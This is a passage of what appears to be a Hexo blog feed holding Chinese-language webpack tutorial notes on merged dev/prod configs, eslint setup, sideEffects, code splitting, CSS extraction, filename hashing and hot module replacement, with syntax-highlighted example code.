class="built_in">require</span>(<span class="string">'webpack-merge'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = webpackMerge.merge(common, &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    contentBase: <span class="string">'./public'</span>,</span><br><span class="line">    hot: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// webpack.prod.js</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> common = <span class="built_in">require</span>(<span class="string">'./webpack.common.js'</span>)</span><br><span class="line"><span class="keyword">const</span> webpackMerge = <span class="built_in">require</span>(<span class="string">'webpack-merge'</span>)</span><br><span class="line"><span class="keyword">const</span> CopyWebpackPlugin = <span class="built_in">require</span>(<span class="string">'copy-webpack-plugin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = webpackMerge.merge(common, &#123;</span><br><span class="line">  mode: <span class="string">'production'</span>,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> CopyWebpackPlugin(&#123;</span><br><span class="line">      patterns: [</span><br><span class="line">        &#123; </span><br><span class="line">          <span class="keyword">from</span>: path.join(__dirname,<span class="string">'public'</span>),</span><br><span class="line">          to: <span class="string">'public'</span> </span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.common.js</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> VueLoaderPlugin = <span class="built_in">require</span>(<span class="string">'vue-loader/lib/plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; CleanWebpackPlugin &#125; = <span class="built_in">require</span>(<span class="string">'clean-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>, <span class="comment">// 入口</span></span><br><span class="line">  output: &#123; </span><br><span class="line">    filename: <span class="string">'bundle.js'</span>, </span><br><span class="line">    path: path.join(__dirname, <span class="string">'dist'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>:&#123;</span><br><span class="line">    rules:[</span><br><span class="line">      &#123; </span><br><span class="line">        test: <span class="regexp">/\.vue$/</span>, </span><br><span class="line">        use: <span class="string">'vue-loader'</span> </span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/.css$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">'style-loader'</span>,</span><br><span class="line">          <span class="string">'css-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/.less$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">'style-loader'</span>,</span><br><span class="line">          <span class="string">'css-loader'</span>,</span><br><span class="line">          <span class="string">'less-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/.png$/</span>,</span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: <span class="string">'url-loader'</span>, <span class="comment">// 大于10KB的还会使用file-loader</span></span><br><span class="line">          options: &#123;</span><br><span class="line">            limit: <span class="number">10</span> * <span class="number">1024</span>, <span class="comment">// 10 KB</span></span><br><span class="line">            esModule: <span class="literal">false</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> VueLoaderPlugin(),</span><br><span class="line">    <span class="keyword">new</span> CleanWebpackPlugin(),</span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      title: <span class="string">'this is a title'</span>,</span><br><span class="line">      template : <span class="string">'./public/index.html'</span>,</span><br><span class="line">      filename: <span class="string">'index.html'</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">      BASE_URL: <span class="built_in">JSON</span>.stringify(<span class="string">'./public/'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置eslint"><a href="#配置eslint" class="headerlink" title="配置eslint"></a>配置eslint</h2><p><code>eslint --init</code>时模块下载失败，这里我就手动安装一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm i -D eslint-plugin-vue eslint-config-standard eslint eslint-plugin-import eslint-plugin-node eslint-plugin-promise eslint-plugin-standard</span><br></pre></td></tr></table></figure><p>然后在<code>webpack.common.js</code>中配置一下就可以</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     test: <span class="regexp">/\.vue$/</span>,</span><br><span class="line">     use: [</span><br><span class="line">       <span class="string">'vue-loader'</span>,</span><br><span class="line">       <span class="string">'eslint-loader'</span></span><br><span class="line">     ]</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>然后再<code>package.json</code>中再配置一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"scripts"</span>: &#123;</span><br><span class="line"><span class="string">"lint"</span>: <span class="string">"eslint src/**/*.vue"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack（四）</title>
      <link href="2020/09/08/%E6%95%B4%E7%90%86-webpack%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>2020/09/08/%E6%95%B4%E7%90%86-webpack%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>Webpack sideEffects</li><li>Code Splitting</li><li>mini-css-extract-plugin</li><li>文件名 Hash</li></ul><a id="more"></a><h2 id="Webpack-sideEffects"><a href="#Webpack-sideEffects" class="headerlink" title="Webpack sideEffects"></a>Webpack sideEffects</h2><blockquote><p>副作用：模块执行时除了导出成员之外所做的事情</p><p>比如一个 css 文件没有导出，可认为有副作用</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|--components</span><br><span class="line">--button.js</span><br><span class="line">--heading.js</span><br><span class="line">--link.js</span><br><span class="line">--index.js</span><br><span class="line">|--index.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// components/index.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> Button &#125; <span class="keyword">from</span> <span class="string">'./button'</span></span><br><span class="line"><span class="keyword">export</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> Link &#125; <span class="keyword">from</span> <span class="string">'./link'</span></span><br><span class="line"><span class="keyword">export</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> Heading &#125; <span class="keyword">from</span> <span class="string">'./heading'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口文件 index.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; Button &#125; <span class="keyword">from</span> <span class="string">'./components'</span></span><br><span class="line"><span class="comment">// 只想载入 Button 却载入了所有模块</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/index.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'bundle.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">'style-loader'</span>,</span><br><span class="line">          <span class="string">'css-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    sideEffects: <span class="literal">true</span>, <span class="comment">// 标识为true就会去package.json中去检查有无副作用</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"31-side-effects"</span>,</span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"0.1.0"</span>,</span><br><span class="line">  <span class="string">"main"</span>: <span class="string">"index.js"</span>,</span><br><span class="line">  <span class="string">"author"</span>: <span class="string">"zce &lt;w@zce.me&gt; (https://zce.me)"</span>,</span><br><span class="line">  <span class="string">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">  <span class="string">"scripts"</span>: &#123;</span><br><span class="line">    <span class="string">"build"</span>: <span class="string">"webpack"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"devDependencies"</span>: &#123;</span><br><span class="line">    <span class="string">"css-loader"</span>: <span class="string">"^3.2.0"</span>,</span><br><span class="line">    <span class="string">"style-loader"</span>: <span class="string">"^1.0.0"</span>,</span><br><span class="line">    <span class="string">"webpack"</span>: <span class="string">"^4.41.2"</span>,</span><br><span class="line">    <span class="string">"webpack-cli"</span>: <span class="string">"^3.3.9"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// "sideEffects": false  //设置为false说明没有副作用，则多余的模块不会被打包</span></span><br><span class="line">  <span class="string">"sideEffects"</span>: [</span><br><span class="line">    <span class="string">"./src/extend.js"</span>, <span class="comment">// 标识一下有副作用而不想被删除的模块，防止不会被打包</span></span><br><span class="line">    <span class="string">"*.css"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码分割"><a href="#代码分割" class="headerlink" title="代码分割"></a>代码分割</h2><blockquote><p>所有模块都打包到一起，但是并不是每个模块在启动时都是必要的</p><p>分包，按需加载</p></blockquote><ul><li>多入口打包：一个页面一个入口，公共部分提取</li><li>动态导入</li></ul><h3 id="多入口打包配置"><a href="#多入口打包配置" class="headerlink" title="多入口打包配置"></a>多入口打包配置</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; CleanWebpackPlugin &#125; = <span class="built_in">require</span>(<span class="string">'clean-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: &#123;</span><br><span class="line">    index: <span class="string">'./src/index.js'</span>,  <span class="comment">// 多入口</span></span><br><span class="line">    album: <span class="string">'./src/album.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'[name].bundle.js'</span> <span class="comment">// 生成对应的文件名</span></span><br><span class="line">  &#125;,</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    splitChunks: &#123;</span><br><span class="line">      <span class="comment">// 自动提取所有公共模块到单独 bundle 一个文件</span></span><br><span class="line">      chunks: <span class="string">'all'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">'style-loader'</span>,</span><br><span class="line">          <span class="string">'css-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> CleanWebpackPlugin(),</span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      title: <span class="string">'Multi Entry'</span>,</span><br><span class="line">      template: <span class="string">'./src/index.html'</span>,</span><br><span class="line">      filename: <span class="string">'index.html'</span>,</span><br><span class="line">      chunks: [<span class="string">'index'</span>]  <span class="comment">// index.html 只会引入打包后的 index.js</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      title: <span class="string">'Multi Entry'</span>,</span><br><span class="line">      template: <span class="string">'./src/album.html'</span>,</span><br><span class="line">      filename: <span class="string">'album.html'</span>,</span><br><span class="line">      chunks: [<span class="string">'album'</span>] <span class="comment">// album.html 只会引入打包后的 album.js</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动态导入"><a href="#动态导入" class="headerlink" title="动态导入"></a>动态导入</h3><blockquote><p>需要某个模块时再去加载，动态导入的模块会被自动分包</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// import posts from './posts/posts'</span></span><br><span class="line"><span class="comment">// import album from './album/album'</span></span><br><span class="line"><span class="comment">// 删除固定导入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> render = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> hash = <span class="built_in">window</span>.location.hash || <span class="string">'#posts'</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> mainElement = <span class="built_in">document</span>.querySelector(<span class="string">'.main'</span>)</span><br><span class="line"></span><br><span class="line">  mainElement.innerHTML = <span class="string">''</span></span><br><span class="line">  <span class="comment">// 根据 hash 值动态导入</span></span><br><span class="line">  <span class="keyword">if</span> (hash === <span class="string">'#posts'</span>) &#123;</span><br><span class="line">    <span class="comment">// 魔法注释添加文件名</span></span><br><span class="line">    <span class="keyword">import</span>(<span class="comment">/* webpackChunkName: 'components' */</span><span class="string">'./posts/posts'</span>).then(<span class="function">(<span class="params">&#123; <span class="keyword">default</span>: posts &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      mainElement.appendChild(posts())</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hash === <span class="string">'#album'</span>) &#123;</span><br><span class="line">    <span class="comment">// 魔法注释添加文件名</span></span><br><span class="line">    <span class="keyword">import</span>(<span class="comment">/* webpackChunkName: 'components' */</span><span class="string">'./album/album'</span>).then(<span class="function">(<span class="params">&#123; <span class="keyword">default</span>: album &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      mainElement.appendChild(album())</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'hashchange'</span>, render)</span><br></pre></td></tr></table></figure><h2 id="mini-css-extract-plugin"><a href="#mini-css-extract-plugin" class="headerlink" title="mini-css-extract-plugin"></a>mini-css-extract-plugin</h2><blockquote><p>mini-css-extract-plugin将css单独提取出来，如果 css 超过 150KB 时需要单独提取</p><p>提取出来后还需要用OptimizeCssAssetsWebpackPlugin进行压缩</p><p>因为 webpack 内置的压缩插件只打包 js 文件</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> MiniCssExtractPlugin = <span class="built_in">require</span>(<span class="string">'mini-css-extract-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> OptimizeCssAssetsWebpackPlugin = <span class="built_in">require</span>(<span class="string">'optimize-css-assets-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> TerserWebpackPlugin = <span class="built_in">require</span>(<span class="string">'terser-webpack-plugin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: &#123;</span><br><span class="line">    main: <span class="string">'./src/index.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimizer: [</span><br><span class="line">      <span class="keyword">new</span> TerserWebpackPlugin(),</span><br><span class="line">      <span class="keyword">new</span> OptimizeCssAssetsWebpackPlugin() </span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="comment">// 'style-loader', // 将样式通过 style 标签注入</span></span><br><span class="line">          MiniCssExtractPlugin.loader, <span class="comment">// 直接通过 link 方式引入</span></span><br><span class="line">          <span class="string">'css-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> MiniCssExtractPlugin()</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>为什么ptimizeCssAssetsWebpackPlugin插件放在这不放在 plugins 数组中呢 ?</p><p>因为放在 plugins 说明在任何时候都会加载这个插件，而我们放到 minimizer 中，只会在生产环境开启 minimizer 时工作</p><p>但是这时会发现 js 没有压缩，因为我们设置了minimizer，webpack会认为我们自定义了压缩插件，所以我们还要添加回去压缩 js 的插件TerserWebpackPlugin。</p></blockquote><h2 id="文件名-Hash"><a href="#文件名-Hash" class="headerlink" title="文件名 Hash"></a>文件名 Hash</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> CleanWebpackPlugin(),</span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      title: <span class="string">'Dynamic import'</span>,</span><br><span class="line">      template: <span class="string">'./src/index.html'</span>,</span><br><span class="line">      filename: <span class="string">'index.html'</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">      filename: <span class="string">'[name]-[contenthash:8].bundle.css'</span> <span class="comment">// 文件级别的hash</span></span><br><span class="line">      <span class="comment">// filename: '[name]-[chunkhash].bundle.css'  // chunk级别</span></span><br><span class="line">      <span class="comment">// filename: '[name]-[hash].bundle.css'       // 项目级别，一个文件改变，所有hash全部改变</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack（三）</title>
      <link href="2020/09/07/%E6%95%B4%E7%90%86-webpack%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>2020/09/07/%E6%95%B4%E7%90%86-webpack%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>HMR</li><li>生产环境优化</li><li>DefinePlugin</li><li>Tree-shaking</li><li>sideEffects</li></ul><a id="more"></a><h2 id="HMR"><a href="#HMR" class="headerlink" title="HMR"></a>HMR</h2><p>原理参考：<a href="https://juejin.im/post/6844904008432222215" target="_blank" rel="noopener">轻松理解webpack热更新原理</a></p><p>如果在页面中存在一个可输入文本框，在其中输入文字后，改变文本框样式后会发现页面刷新，文字丢失</p><p>那么如何在页面不刷新的前提下，模块也可以及时更新。</p><blockquote><p>HMR：Hot Module Replacement 模块热更新</p><p>应用程序运行过程中实时替换某个模块，页面状态不会改变</p></blockquote><p>运行命令：<code>webpack-dev-server --hot</code></p><p>或者配置<code>webpack.config.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">    hot: <span class="literal">true</span></span><br><span class="line">    <span class="comment">// hotOnly: true // 只使用 HMR，不会 fallback 到 live reloading，可以发现错误代码</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><blockquote><p>此时会发现，修改源代码中的样式文件已经实现热更新，但是修改js文件还不能实现</p><p>因为样式文件在 style-loader 中已经处理过，直接覆盖就好，而 js 文件导出的对象不确定，webpack不知道怎么处理，并没有统一的处理方案。在Vue等框架中每种文件都是有规律的，所以不用手动写逻辑。</p><p>综上 HMR 需要手动处理模块热更新逻辑</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.hot.accept(<span class="string">'./editor.js'</span>, () =&gt; &#123;</span><br><span class="line">   <span class="comment">// 在这里写更新逻辑，则页面不会自动刷新</span></span><br><span class="line">   <span class="comment">// 如果没有此处的手动处理，页面还会自动刷新</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p> 以编辑器和图片热更新逻辑为例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ================================================================</span></span><br><span class="line"><span class="comment">// HMR 手动处理模块热更新</span></span><br><span class="line"><span class="comment">// 不用担心这些代码在生产环境冗余的问题，因为通过 webpack 打包后，</span></span><br><span class="line"><span class="comment">// 这些代码全部会被移除，这些只是开发阶段用到</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">module</span>.hot) &#123;</span><br><span class="line">  <span class="keyword">let</span> hotEditor = editor</span><br><span class="line">  <span class="built_in">module</span>.hot.accept(<span class="string">'./editor.js'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 当 editor.js 更新，自动执行此函数</span></span><br><span class="line">    <span class="comment">// 临时记录编辑器内容</span></span><br><span class="line">    <span class="keyword">const</span> value = hotEditor.innerHTML</span><br><span class="line">    <span class="comment">// 移除更新前的元素</span></span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(hotEditor)</span><br><span class="line">    <span class="comment">// 创建新的编辑器</span></span><br><span class="line">    <span class="comment">// 此时 createEditor 已经是更新过后的函数了</span></span><br><span class="line">    hotEditor = createEditor()</span><br><span class="line">    <span class="comment">// 还原编辑器内容</span></span><br><span class="line">    hotEditor.innerHTML = value</span><br><span class="line">    <span class="comment">// 追加到页面</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(hotEditor)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">module</span>.hot.accept(<span class="string">'./better.png'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 当 better.png 更新后执行</span></span><br><span class="line">    <span class="comment">// 重写设置 src 